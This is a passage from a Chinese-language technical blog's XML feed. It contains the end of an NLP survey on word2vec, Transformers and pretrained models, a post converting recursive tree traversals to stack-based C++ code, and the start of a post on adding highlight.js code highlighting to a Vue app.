<h2 id="2-历史与发展"><a href="#2-历史与发展" class="headerlink" title="2. 历史与发展"></a>2. 历史与发展</h2><p>1950年，计算机科学之父图灵提出了“图灵测试”，标志着人工智能领域的开端。而此时，正值苏美冷战，美国政府为了更方便地破译苏联相关文件，大力投入机器翻译的研究，自然语言处理从此兴起。从这之后的一段时期内，自然语言处理主要采用基于规则的方法，这种方法依赖于语言学，它通过分析词法、语法等信息，总结这些信息之间的规则，从而达到翻译的效果。这种类似于专家系统的方法，泛化性差、不便于优化，最终进展缓慢，未能达到预期效果。</p>
<p>到了20世纪80、90年代，互联网飞速发展，计算机硬件也有了显著提升。同时，自然语言处理引入了统计机器学习算法，基于规则的方法逐渐被基于统计的方法所取代。在这一阶段，自然语言处理取得了实质性突破，并走向了实际应用。</p>
<p>而从2008年左右开始，随着深度学习神经网络在图像处理、语音识别等领域取得了显著的成果，它也开始被应用到自然语言处理领域。从最开始的词嵌入、word2vec，到RNN、GRU、LSTM等神经网络模型，再到最近的注意力机制、预训练语言模型等等。伴随着深度学习的加持，自然语言处理也迎来了突飞猛进。</p>
<h2 id="3-相关进展"><a href="#3-相关进展" class="headerlink" title="3. 相关进展"></a>3. 相关进展</h2><p>接下来，我将介绍自然语言处理与深度学习结合后的相关进展。</p>
<h3 id="3-1-word2vec"><a href="#3-1-word2vec" class="headerlink" title="3.1. word2vec"></a>3.1. word2vec</h3><p>在自然语言中，词是最基本的单元。为了让计算机理解并处理自然语言，我们首先就要对词进行编码。由于自然语言中词的数量是有限的，那就可以对每个词指定一个唯一序号，比如：英文单词word的序号可以是1156。而为了方便计算，通常会将序号转换成统一的向量。简单做法是对单词序号进行one-hot编码，每个单词都对应一个长度为N（单词总数）的向量（一维数组），向量中只有该单词序号对应位置的元素值为1，其它都为0。</p>
<p>虽然使用one-hot编码构造词向量十分容易，但并不是一个较好的方法。主要原因是无法很好地表示词的语义，比如苹果和橘子是相似单词（都是水果），但one-hot向量就无法体现这种相似关系。</p>
<p>为了解决上述问题，Google的Mikolov等人于2013年发表了两篇与word2vec相关的原始论文[1][2]。word2vec将词表示成一个定长的向量，并通过上下文学习词的语义信息，使得这些向量能表达词特征、词之间关系等语义信息。word2vec包含两个模型：跳字模型（Skip-gram）[1] 和连续词袋模型（continuous bag of words，CBOW）[2]，它们的作用分别是：通过某个中心词预测上下文、通过上下文预测某个中心词。比如，有一句话”I drink apple juice”，Skip-gram模型是用apple预测其它词，CBOW模型则是用其它词预测出apple。</p>
<h4 id="3-1-1-CBOW"><a href="#3-1-1-CBOW" class="headerlink" title="3.1.1. CBOW"></a>3.1.1. CBOW</h4><p><img src="/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E7%BB%BC%E8%BF%B0/image.png" alt="1"></p>
<p>首先介绍CBOW模型，它是一个三层神经网络，通过上下文预测中心词。以某个训练数据”I drink apple juice”为例，可以把apple作为标签值先剔除，将”I drink juice”作为输入，apple作为待预测的中心词。</p>
<ul>
<li><p>输入层： $x_i$ 是上下文中第i个单词的one-hot向量，长度为 $V$ 。比如在训练数据<code>I drink _ juice</code>中，$x_2$就是词”drink”的one-hot向量。V是词库中词的总数，C是上下文中词的个数，k是训练集的大小。</p>
</li>
<li><p>隐藏层：输入层$x_i$乘上$W_{V \times N}$求和即得到隐藏层，公式为$\sum_{i&#x3D;1}^C x_i \times W_{V \times N}$。其中，$W_{V \times N}$是一个二维矩阵，V是词的总数，N代表着词的特征向量，长度可自定义。这个矩阵的每一行即可看作每个词对应的特征向量，而$x_i \times W_{V \times N}$就相当于取第i个词对应的特征向量。隐藏层没有激活函数，最后输出是一个$1 \times N$的向量。</p>
</li>
<li><p>输出层：输出层是中心词的预测值，一个$1 \times V$的向量。它由隐藏层输出乘上 $W_{N \times V}’$ ，并通过softmax激活函数得到，向量中每个位置的值相当于对应词的概率。中心词预测值会与实际值比较，并通过损失函数计算出损失值，再求出梯度值反向传播，最终更新 $W_{V \times N}$ 和 $W_{N \times V}’$ 的值。</p>
</li>
</ul>
<h4 id="3-1-2-Skip-gram"><a href="#3-1-2-Skip-gram" class="headerlink" title="3.1.2. Skip-gram"></a>3.1.2. Skip-gram</h4><p><img src="/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E7%BB%BC%E8%BF%B0/image_1.png" alt="1"></p>
<p>Skip-gram模型与CBOW类似，也是一个三层神经网络模型。不同在于，它是通过中心词预测上下文，即通过”apple”预测出”I drink juice”。接下来简单介绍Skip-gram模型中各层：</p>
<ul>
<li><p>输入层：中心词的one-hot向量，$1 \times V$。</p>
</li>
<li><p>隐藏层：一个$1 \times N$ 的向量，输入层直接乘上$W_{V \times N}$即可得到。</p>
</li>
<li><p>输出层：由隐藏层乘上$W_{N \times V}’$并通过softmax激活函数得到，是一个$1 \times V$的向量。在这个向量中，与上下文相关的词所对应位置上的概率值较高。</p>
</li>
</ul>
<p>两种模型训练结束后，会取 $W_{V \times N}$ 作为词向量矩阵，第i行就代表词库中第i个词的词向量。词向量可用来计算词之间的相似度（词向量点乘）。比如，输入<code>I drink _ juice</code>上下文，预测出中心词为apple、orange的概率可能都很高，原因就是在$W_{V \times N}$中apple和orange对应的词向量十分相似，即相似度高。词向量还可以用于机器翻译、命名实体识别、关系抽取等等。</p>
<p>其实这两种模型的原型在2003年就已出现[3]，而Mikolov在13年的论文中主要是简化了模型，且提出了负采样与层序softmax方法，使得训练更加高效。</p>
<h3 id="3-2-Transformer"><a href="#3-2-Transformer" class="headerlink" title="3.2. Transformer"></a>3.2. Transformer</h3><p>词向量提出的同时，深度学习RNN框架也被应用到NLP中，并结合词向量取得了巨大成效。但是，RNN网络也存在一些问题，比如：难以并行化、难以建立长距离和层级化的依赖关系。而这些问题都在2017年发表的论文《Attention Is All You Need》[4]中得到有效解决。正是在这篇论文中，提出了Transformer模型。Transformer中抛弃了传统的复杂的CNN和RNN，整个网络结构完全由注意力机制组成。</p>
<h4 id="3-2-1-Self-Attention"><a href="#3-2-1-Self-Attention" class="headerlink" title="3.2.1. Self-Attention"></a>3.2.1. Self-Attention</h4><p>Transformer最核心的内容是自注意力机制(Self-Attention)，它是注意力机制(Attention)的变体。注意力的作用是从大量信息中筛选出少量重要信息，并聚焦在这些信息上，比如：人在看一幅图像时，会重点关注较为吸引的部分，而忽略其它信息，这就是注意力的体现。但注意力机制会关注全局信息，即关注输入数据与输出数据以及中间产物的相关性。而自注意力机制则减少了对外部其它数据的关注，只关注输入数据本身，更擅长捕捉数据内部的相关性。</p>
<p>自注意力机制的算法过程如下：</p>
<ol>
<li><p>将输入中one-hot编码的单词乘上word2vec中得出的词向量矩阵，得到单词的词向量。</p>
</li>
<li><p>将每个词的词向量分别乘上三个不同的矩阵，得到q、k、v三个向量。q是query，用来与k做匹配；k是key，代表着v的key；v是value，代表待提取信息的值。</p>
</li>
<li><p>依次将各个词的q与每个词的k点乘，再除于$\sqrt{d}$（d是q和k的维度）。比如，第1个单词对应的结果$a_{1,j} &#x3D; q_1 \cdot k_j \div \sqrt{d}$，j从1到n，组成一个向量。</p>
</li>
<li><p>将上一步每个词的结果进行softmax。</p>
</li>
<li><p>最后，每个词的输出为$b_i &#x3D; \sum_j(a_{i,j}v_i)$。</p>
</li>
</ol>
<p><img src="/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E7%BB%BC%E8%BF%B0/image_2.png" alt="1"></p>
<p>自注意力机制不仅建立了输入数据中词与词之间的关系，还能并行地高效地计算出每个词的输出。</p>
<h4 id="3-2-2-Transformer"><a href="#3-2-2-Transformer" class="headerlink" title="3.2.2. Transformer"></a>3.2.2. Transformer</h4><p>Transformer的总体架构如下：</p>
<p><img src="/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E7%BB%BC%E8%BF%B0/image_3.png" alt="1"></p>
<p>它分为两部分：编码器（Encoder）和解码器（Decoder）。</p>
<p>编码器的输入是词向量加上位置编码（表明这个词是在哪个位置），再通过多头自注意力操作（Multi-Head Attention）、全连接网络（Feed Forward）两部分得到输出。其中，多头自注意力就是输入的每个词对应多组q、k、v，每组之间互不影响，最终每个词产生多个输出b值，组成一个向量。编码器是transformer的核心，它通常会有多层，前一层的输出会作为下一层的输入，最后一层的输出会作为解码器的一部分输入。</p>
<p>解码器包含两个不同的多头自注意力操作（Masked Multi-Head Attention和Multi-Head Attention）、全连接网络（Feed Forward）三部分。解码器会运行多次，每次只输出一个单词，直到输出完整的目标文本。已输出的部分会组合起来，作为下一次解码器的输入。其中，Masked Multi-Head Attention是将输入中未得到的部分遮掩起来，再进行多头自注意力操作。比如原有5个输入，但某次只有2个输入，那么q1和q2只会与k1、k2相乘，。</p>
<h3 id="3-3-预训练模型"><a href="#3-3-预训练模型" class="headerlink" title="3.3. 预训练模型"></a>3.3. 预训练模型</h3><p>如果深度学习的应用，让NLP有了第一次飞跃。那预训练模型的出现，让NLP有了第二次的飞跃。预训练通过自监督学习（不需要标注）从大规模语料数据中学习出一个强大的语言模型，再通过微调迁移到具体任务，最终达成显著效果。</p>
<p>预训练模型的优势如下：</p>
<ul>
<li><p>由于不需要标注数据，预训练模型可以从无限的文本中（比如互联网上大量的文本数据）学习通用的语法语义知识。</p>
</li>
<li><p>具有良好的复用性，通过微调可应用到具体任务，减少重复性劳动、节约资源。</p>
</li>
<li><p>预训练模型几乎在所有NLP任务中都取得显著成效。</p>
</li>
</ul>
<p>预训练模型的关键技术有三个：</p>
<ol>
<li><p>transformer。</p>
</li>
<li><p>自监督学习，它不同于监督学习，需要对目标数据进行标注，它是取输入中的一部分作为目标数据。常见的方法有：预测下一个词，输入一个句子的前一部分预测下一个词，预训练模型ELMo[5]和著名的GPT[6]等就是采用这种方法；遮盖输入，将句子中的某个词遮盖，通过模型来预测这个词，预训练模型Bert[7]则采用这种方法。</p>
</li>
<li><p>微调，是将预训练模型迁移到具体的任务上。具体方法是：在预训练模型上再叠加一层特定任务层，训练并进行调参时，可以固定预训练模型的参数，也可以调整预训练模型的参数，通常采用后者。由于目前的预训练模型都非常庞大，为了让预训练模型调参更加高效，又提出了Adaptor[8]。它插入在预训练模型中一起训练，但迁移调参时只需要Adaptor中的参数。</p>
</li>
</ol>
<p>关于预训练模型的架构，以Bert为例：输入是词的one-hot编码向量，乘上词向量矩阵后，再经过多层transformer中的Encoder模块，最终得到输出。</p>
<p><img src="/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E7%BB%BC%E8%BF%B0/image_4.png" alt="1"></p>
<h2 id="4-结束语"><a href="#4-结束语" class="headerlink" title="4. 结束语"></a>4. 结束语</h2><p>本文介绍了NLP领域的流行研究进展，其中transformer和预训练模型的出现，具有划时代的意义。但随着预训练模型越来越庞大，也将触及硬件瓶颈。另外，NLP在一些阅读理解、文本推理等任务上的表示，也差强人意。总而言之，NLP领域依旧存在着巨大的前景与挑战，仍然需要大家的长期努力。</p>
<h2 id="5-参考文献"><a href="#5-参考文献" class="headerlink" title="5. 参考文献"></a>5. 参考文献</h2><p>[1]Mikolov, T., Sutskever, I., Chen, K., Corrado, G. S., &amp; Dean, J. (2013). Distributed representations of words and phrases and their compositionality. In Advances in neural information processing systems (pp. 3111-3119).</p>
<p>[2]Mikolov, T., Chen, K., Corrado, G., &amp; Dean, J. (2013). Efficient estimation of word representations in vector space. arXiv preprint arXiv:1301.3781.</p>
<p>[3]Yoshua Bengio, R´ejean Ducharme, Pascal Vincent, and Christian Janvin. A neural probabilistic language model. The Journal of Machine Learning Research, 3:1137–1155, 2003.</p>
<p>[4]Vaswani A, Shazeer N, Parmar N, et al. Attention is all you need[C]&#x2F;&#x2F;Advances in neural information processing systems. 2017: 5998-6008.</p>
<p>[5]Peters M E, Neumann M, Iyyer M, et al. Deep contextualized word representations[J]. arXiv preprint arXiv:1802.05365, 2018.</p>
<p>[6]Radford A, Narasimhan K, Salimans T, et al. Improving language understanding by generative pre-training[J]. 2018.</p>
<p>[7]Devlin J, Chang M W, Lee K, et al. Bert: Pre-training of deep bidirectional transformers for language understanding[J]. arXiv preprint arXiv:1810.04805, 2018.</p>
<p>[8]Houlsby N, Giurgiu A, Jastrzebski S, et al. Parameter-efficient transfer learning for NLP[C]&#x2F;&#x2F;International Conference on Machine Learning. PMLR, 2019: 2790-2799.</p>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>人工智能</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>自然语言处理</tag>
      </tags>
  </entry>
  <entry>
    <title>递归与非递归的转换（树的非递归遍历）</title>
    <url>/%E9%80%92%E5%BD%92%E4%B8%8E%E9%9D%9E%E9%80%92%E5%BD%92%E7%9A%84%E8%BD%AC%E6%8D%A2.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>递归是计算机中基本而实用的算法思想。</p>
<p>主要用于解决<strong>有边界的重复性操作</strong>问题，即满足<strong>数学归纳法</strong>特性的问题。比如斐波那契数列。</p>
<p>可递归却有不少缺陷：运行效率低下、递归过多容易栈溢出等等。</p>
<p>但作为一把锋刃的解题利器，我们也不能抛弃它。众所周知，递归的本质即为<code>栈</code>，它运行在内存中，受操作系统控制，一个函数就是栈中的一个单位(栈帧)。递归的过程，就是内存中栈的入栈出栈操作。</p>
<p>因而，我们<strong>必然</strong>可以用自定义的栈来实现这个过程，即将递归转化为非递归。</p>
<p>那如何快速地将一个递归程序转化为一个非递归程序呢？我想用<code>树的先、中、后序遍历</code>的求解，来简单表述我的一己之见。</p>
<span id="more"></span>

<h2 id="1-树的先、中、后序遍历-递归模式"><a href="#1-树的先、中、后序遍历-递归模式" class="headerlink" title="1. 树的先、中、后序遍历(递归模式)"></a>1. 树的先、中、后序遍历(递归模式)</h2><h3 id="1-1-先中后序遍历解释"><a href="#1-1-先中后序遍历解释" class="headerlink" title="1.1. 先中后序遍历解释"></a>1.1. 先中后序遍历解释</h3><p>对于一棵树，先序遍历先输出<strong>根结点的数据</strong>、再输出<strong>左孩子树的数据</strong>、最后输出<strong>右孩子树的数据</strong>。简而言之，输出顺序为<strong>根—左—右</strong>。</p>
<p>以此类推，中序和后序遍历的输出顺序分别为：<strong>左—根—右</strong>、<strong>左—右—根</strong>。</p>
<h3 id="1-2-示例"><a href="#1-2-示例" class="headerlink" title="1.2. 示例"></a>1.2. 示例</h3><p>对于如下的一棵树：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">       A</span><br><span class="line">   B       C</span><br><span class="line">D     E      F</span><br><span class="line">    G   H     J</span><br><span class="line">  I    K  L</span><br></pre></td></tr></table></figure>

<p>先序遍历：<code>ABDEGIHKLCFJ</code><br>中序遍历：<code>DBIGEKHLACFJ</code><br>后序遍历：<code>DIGKLHEBJFCA</code></p>
<h3 id="1-3-递归实现遍历"><a href="#1-3-递归实现遍历" class="headerlink" title="1.3. 递归实现遍历"></a>1.3. 递归实现遍历</h3><p>先中后序遍历一棵树，代码十分简单。如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 树的数据结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BTNode</span> &#123;</span><br><span class="line">    <span class="type">char</span> data;</span><br><span class="line">    BTNode *lchild, *rchild;</span><br><span class="line">&#125;BTNode, *BiTree;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 先序遍历，递归</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">preOrderTraverse</span><span class="params">(BiTree bTree)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bTree) &#123;</span><br><span class="line">        cout&lt;&lt;bTree-&gt;data;               <span class="comment">// 先输出根节点的数据</span></span><br><span class="line">        <span class="built_in">preOrderTraverse</span>(bTree-&gt;lchild); <span class="comment">// 输出左子树的数据</span></span><br><span class="line">        <span class="built_in">preOrderTraverse</span>(bTree-&gt;rchild); <span class="comment">// 输出右子树的数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中序遍历，递归</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inOrderTraverse</span><span class="params">(BiTree bTree)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bTree) &#123;</span><br><span class="line">        <span class="built_in">inOrderTraverse</span>(bTree-&gt;lchild);</span><br><span class="line">        cout&lt;&lt;bTree-&gt;data;</span><br><span class="line">        <span class="built_in">inOrderTraverse</span>(bTree-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后序遍历，递归</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">postOrderTraverse</span><span class="params">(BiTree bTree)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bTree) &#123;</span><br><span class="line">        <span class="built_in">postOrderTraverse</span>(bTree-&gt;lchild);</span><br><span class="line">        <span class="built_in">postOrderTraverse</span>(bTree-&gt;rchild);</span><br><span class="line">        cout&lt;&lt;bTree-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-非递归遍历"><a href="#2-非递归遍历" class="headerlink" title="2. 非递归遍历"></a>2. 非递归遍历</h2><h3 id="2-1-递归到非递归转换分析"><a href="#2-1-递归到非递归转换分析" class="headerlink" title="2.1. 递归到非递归转换分析"></a>2.1. 递归到非递归转换分析</h3><p>对于递归的非递归转换，我们以函数栈的角度去解析就十分简单了。</p>
<p>以<strong>中序的递归遍历</strong>为例：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BTNode</span> &#123;</span><br><span class="line">    <span class="type">char</span> data;</span><br><span class="line">    BTNode *lchild, *rchild;</span><br><span class="line">&#125; BTNode, *BiTree;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中序遍历，递归</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inOrderTraverse</span><span class="params">(BiTree bTree)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bTree) &#123;</span><br><span class="line">        <span class="built_in">inOrderTraverse</span>(bTree-&gt;lchild);</span><br><span class="line">        cout&lt;&lt;bTree-&gt;data;</span><br><span class="line">        <span class="built_in">inOrderTraverse</span>(bTree-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当主函数<code>inOrderTraverse(bTree)</code>中第一个<code>inOrderTraverse(bTree-&gt;lchild)</code>子函数被调用时，主函数中<strong>剩余的数据和步骤</strong>被保留在当前的函数栈帧中。而子函数入函数栈，成为栈顶函数。当子函数运行结束，返回时，子函数出栈，栈顶又变为主函数。然后，程序继续执行主函数中的剩余步骤。</p>
<p>同理子函数的子函数也是如此操作。过程如下：</p>
<p>主函数入栈：</p>
<p><img src="/%E9%80%92%E5%BD%92%E4%B8%8E%E9%9D%9E%E9%80%92%E5%BD%92%E7%9A%84%E8%BD%AC%E6%8D%A2/2.png" alt="递归与非递归的转换/2.png"></p>
<p>主函数调用第一个子函数的操作出栈，剩余步骤保存在栈中，而被调用子函数(蓝色)入栈：</p>
<p><img src="/%E9%80%92%E5%BD%92%E4%B8%8E%E9%9D%9E%E9%80%92%E5%BD%92%E7%9A%84%E8%BD%AC%E6%8D%A2/1.png" alt="递归与非递归的转换/1.png"></p>
<p>显而易见，这就是一个出栈入栈的过程。函数保存在栈帧中的操作和数据，我们可以通过自定义的栈来储存。</p>
<h3 id="2-2-非递归的实现"><a href="#2-2-非递归的实现" class="headerlink" title="2.2. 非递归的实现"></a>2.2. 非递归的实现</h3><p>如果，栈中可以存放操作语句，那非递归的实现将会变得十分容易，可惜，栈中只能存放数据。</p>
<p>不过，幸运的是，递归的操作都是重复的，我们只要将数据统一，并根据数据进行相对应操作即可。</p>
<p>在树的递归遍历中，其实只有一个操作，那就是输出结点数据，而剩余函数只是个入栈的过程。</p>
<p>以中序递归遍历为例：</p>
<ol>
<li><p>依次将右孩子（第二个子函数）、根结点（输出数据操作）、左孩子（第一个子函数）入栈。</p>
</li>
<li><p>然后检测栈顶过程中，遇到<strong>不为空</strong>的左&#x2F;右孩子，则重复上述入栈操作；遇到根结点则输出数据；<strong>栈顶指针为空</strong>则出栈。</p>
</li>
</ol>
<p>但是，如何判断是孩子、还是根结点呢？我认为可以有<strong>两种方法</strong>：</p>
<p>（1）设计一个结构体作为栈基本单位。该结构体有两个值：一个用来判断是根结点（<code>根结点</code>则<code>输出数据</code>）还是孩子（<code>孩子</code>则<code>右-根-左入栈</code>）的标志位，另一个是指向树的指针：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 中序遍历，非递归第一种方法</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">bool</span> flag;      <span class="comment">// 用来判断是根结点(true)还是孩子(false)</span></span><br><span class="line">    BiTree bTree;   <span class="comment">// 树指针</span></span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inOrderTraverse1</span><span class="params">(BiTree bTree)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!bTree) &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;该树为空！&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;非递归中序遍历：&quot;</span>;</span><br><span class="line">    stack&lt;Node&gt; s;</span><br><span class="line">    Node temp, top;</span><br><span class="line">    temp.flag = <span class="literal">false</span>;</span><br><span class="line">    temp.bTree = bTree;</span><br><span class="line">    s.<span class="built_in">push</span>(temp);</span><br><span class="line">    <span class="keyword">while</span> (!s.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        top = s.<span class="built_in">top</span>();</span><br><span class="line">        s.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="comment">// 如果栈顶树指针为空，则不操作</span></span><br><span class="line">        <span class="keyword">if</span> (top.bTree == <span class="literal">NULL</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// 如果是根结点</span></span><br><span class="line">        <span class="keyword">if</span> (top.flag) &#123;</span><br><span class="line">            cout &lt;&lt; top.bTree-&gt;data;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果是孩子</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            temp.flag = <span class="literal">false</span>;</span><br><span class="line">            temp.bTree = top.bTree-&gt;rchild;</span><br><span class="line">            s.<span class="built_in">push</span>(temp);</span><br><span class="line"></span><br><span class="line">            temp.flag = <span class="literal">true</span>;</span><br><span class="line">            temp.bTree = top.bTree;</span><br><span class="line">            s.<span class="built_in">push</span>(temp);</span><br><span class="line"></span><br><span class="line">            temp.flag = <span class="literal">false</span>;</span><br><span class="line">            temp.bTree = top.bTree-&gt;lchild;</span><br><span class="line">            s.<span class="built_in">push</span>(temp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（2）将树结点作为栈的基本单位。设置一种数据结点，只存放数据，而左右孩子为空。每次检测栈顶结点，若左右孩子为空则输出，否则依次将<code>不为空的右孩子</code>、<code>根结点的数据结点</code>、<code>不为空的左孩子</code>入栈：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 中序非递归遍历，第二种算法</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inOrderTraverse2</span><span class="params">(BiTree bTree)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!bTree) &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;该树为空！&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;非递归中序遍历：&quot;</span>;</span><br><span class="line">    stack&lt;BTNode&gt; s;</span><br><span class="line">    s.<span class="built_in">push</span>(*bTree);</span><br><span class="line">    BTNode temp, dataBTNode;</span><br><span class="line">    dataBTNode.lchild = dataBTNode.rchild = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (!s.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        temp = s.<span class="built_in">top</span>();</span><br><span class="line">        s.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!temp.lchild &amp;&amp; !temp.rchild) cout&lt;&lt;temp.data;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            dataBTNode.data = temp.data;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (temp.rchild) s.<span class="built_in">push</span>(*temp.rchild);</span><br><span class="line">            s.<span class="built_in">push</span>(dataBTNode);</span><br><span class="line">            <span class="keyword">if</span> (temp.lchild) s.<span class="built_in">push</span>(*temp.lchild);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-后话"><a href="#3-后话" class="headerlink" title="3. 后话"></a>3. 后话</h2><p>实际上，递归并非我们想象中那么拖慢效率。在不至于递归栈爆的情况下，我们还是可以放心地使用递归的。</p>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title>通过highlight.js在vue中实现代码高亮</title>
    <url>/%E9%80%9A%E8%BF%87highlight%E5%9C%A8vue%E4%B8%AD%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>在 <code>vue-cli3</code> 项目中，通过<code>highlight.js</code>，实现页面中代码高亮。</p>
<p>请先了解<a href="https://highlightjs.org/">highlight.js官网</a>中的使用说明。</p>
<span id="more"></span>

<h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install highlight.js --save</span><br></pre></td></tr></table></figure>

<h2 id="2-封装成vue插件"><a href="#2-封装成vue插件" class="headerlink" title="2. 封装成vue插件"></a>2. 封装成vue插件</h2><p><a href="https://cn.vuejs.org/v2/guide/plugins.html">官方文档—自定义插件</a></p>
<p><a href="https://cn.vuejs.org/v2/guide/custom-directive.html">官方文档—自定义指令</a></p>
<p>新建<code>highlight.js</code>文件，并添加：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src/utils/highlight.js 文件路径，纯属自定义</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// highlight.js  代码高亮指令</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Hljs</span> <span class="keyword">from</span> <span class="string">&#x27;highlight.js&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;highlight.js/styles/tomorrow-night.css&#x27;</span>; <span class="comment">// 代码高亮风格，选择更多风格需导入 node_modules/hightlight.js/styles/ 目录下其它css文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Highlight</span> = &#123;&#125;;</span><br><span class="line"><span class="comment">// 自定义插件</span></span><br><span class="line"><span class="title class_">Highlight</span>.<span class="property">install</span> = <span class="keyword">function</span> (<span class="params">Vue</span>) &#123;</span><br><span class="line">    <span class="comment">// 自定义指令 v-highlight</span></span><br><span class="line">    <span class="title class_">Vue</span>.<span class="title function_">directive</span>(<span class="string">&#x27;highlight&#x27;</span>, &#123;</span><br><span class="line">        <span class="comment">// 被绑定元素插入父节点时调用</span></span><br><span class="line">        <span class="attr">inserted</span>: <span class="keyword">function</span>(<span class="params">el</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> blocks = el.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;pre code&#x27;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; blocks.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                <span class="title class_">Hljs</span>.<span class="title function_">highlightBlock</span>(blocks[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 指令所在组件的 VNode 及其子 VNode 全部更新后调用</span></span><br><span class="line">        <span class="attr">componentUpdated</span>: <span class="keyword">function</span>(<span class="params">el</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> blocks = el.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;pre code&#x27;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; blocks.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                <span class="title class_">Hljs</span>.<span class="title function_">highlightBlock</span>(blocks[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Highlight</span>;</span><br></pre></td></tr></table></figure>

